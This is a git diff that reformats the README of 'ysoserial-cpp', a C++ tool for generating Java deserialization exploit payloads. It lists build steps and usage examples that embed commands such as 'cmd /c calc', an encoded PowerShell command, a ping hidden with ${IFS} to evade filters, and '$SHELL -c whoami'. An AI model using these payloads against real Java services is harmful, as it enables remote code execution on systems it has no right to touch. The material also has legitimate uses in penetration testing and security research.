@@ -28,45 +28,40 @@ Implementation of object serializations an weaponizing in cpp similar functional
 GNU GPL3 License ( JennyLab OpenSource )
     
 
-    * Build
-    
-     ```
-     
-     g++ -std=c++17 -O2 -o ysoserial-cpp ysoserial.cpp
+### Build
 
-     ```
+```
+g++ -std=c++17 -O2 -o ysoserial-cpp ysoserial.cpp
+```
 
 
-    * Payload inject execution commands abusing serialization
-        
-        ```
-        ./ysoserial-cpp templates "cmd /c calc"
-        ```
-        
-    * Encoding
-    
-        ```
-        ./ysoserial-cpp object1 "powershell -enc <base64_command>"
-        ```
-        
-    * Obfucation 
+### Payload inject execution commands abusing serialization
+`./ysoserial-cpp templates "cmd /c calc"`
 
-        ```
-        ./ysoserial-cpp object2 "p\${IFS}ing\${IFS}8.8.8.8"
-        ```
+### Encoding
+
+```
+./ysoserial-cpp object1 "powershell -enc <base64_command>"
+```
         
-    * Inyecting ENV
+### Obfucation 
+
+```
+./ysoserial-cpp object2 "p\${IFS}ing\${IFS}8.8.8.8"
+```
         
-        ```
-        ./ysoserial-cpp templates "\$SHELL -c 'whoami'"
-        ```
-        
+### Inyecting ENV
+
+```
+./ysoserial-cpp templates "\$SHELL -c 'whoami'"
+```
+
 
 
 
 ## Code "ysoserial-cpp.cpp"
-    ```
-        ysoserial.cpp   # ysoserial-cpp
-        ├── JavaSerialization   # Constants and types
-        ├── JavaPayloadGen # Main class to make and object in C++ to serialize this serialization with provide and destination in seralize... Seria... Lize!!!
-    ```                                                           
+```
+  ysoserial.cpp   # ysoserial-cpp
+  ├── JavaSerialization   # Constants and types
+  ├── JavaPayloadGen # Main class to make and object in C++ to serialize this serialization with provide and destination in seralize... Seria... Lize!!!
+```                                                           
